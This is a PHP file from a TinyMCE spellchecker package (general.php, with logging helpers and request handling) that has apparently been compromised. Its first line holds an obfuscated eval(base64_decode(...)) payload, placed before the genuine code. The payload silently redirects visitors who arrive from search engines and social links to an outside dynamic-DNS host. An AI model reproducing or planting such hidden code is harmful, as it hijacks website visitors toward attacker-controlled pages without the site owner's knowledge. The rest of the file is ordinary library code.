<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tL2wiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsKaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSBhbmQgIXN0cmlzdHIoJHJlZmVyZXIsIkVlWXAzRDciKSl7CmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9pcnhucmphdy5kZG5zLm1lLnVrLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
/**
 * general.php
 *
 * @package MCManager.includes
 * @author Moxiecode
 * @copyright Copyright © 2007, Moxiecode Systems AB, All rights reserved.
 */

@error_reporting(E_ALL ^ E_NOTICE);
$config = array();

require_once(dirname(__FILE__) . "/../classes/utils/Logger.php");
require_once(dirname(__FILE__) . "/../classes/utils/JSON.php");
require_once(dirname(__FILE__) . "/../config.php");
require_once(dirname(__FILE__) . "/../classes/SpellChecker.php");

if (isset($config['general.engine']))
	require_once(dirname(__FILE__) . "/../classes/" . $config["general.engine"] . ".php");

/**
 * Returns an request value by name without magic quoting.
 *
 * @param String $name Name of parameter to get.
 * @param String $default_value Default value to return if value not found.
 * @return String request value by name without magic quoting or default value.
 */
function getRequestParam($name, $default_value = false) {
	if (!isset($_REQUEST[$name]))
		return $default_value;

	if (is_array($_REQUEST[$name])) {
		$newarray = array();

		foreach ($_REQUEST[$name] as $name => $value)
			$newarray[$name] = $value;

		return $newarray;
	}

	return $_REQUEST[$name];
}

function &getLogger() {
	global $mcLogger, $man;

	if (isset($man))
		$mcLogger = $man->getLogger();

	if (!$mcLogger) {
		$mcLogger = new Moxiecode_Logger();

		// Set logger options
		$mcLogger->setPath(dirname(__FILE__) . "/../logs");
		$mcLogger->setMaxSize("100kb");
		$mcLogger->setMaxFiles("10");
		$mcLogger->setFormat("{time} - {message}");
	}

	return $mcLogger;
}

function debug($msg) {
	$args = func_get_args();

	$log = getLogger();
	$log->debug(implode(', ', $args));
}

function info($msg) {
	$args = func_get_args();

	$log = getLogger();
	$log->info(implode(', ', $args));
}

function error($msg) {
	$args = func_get_args();

	$log = getLogger();
	$log->error(implode(', ', $args));
}

function warn($msg) {
	$args = func_get_args();

	$log = getLogger();
	$log->warn(implode(', ', $args));
}

function fatal($msg) {
	$args = func_get_args();

	$log = getLogger();
	$log->fatal(implode(', ', $args));
}

?>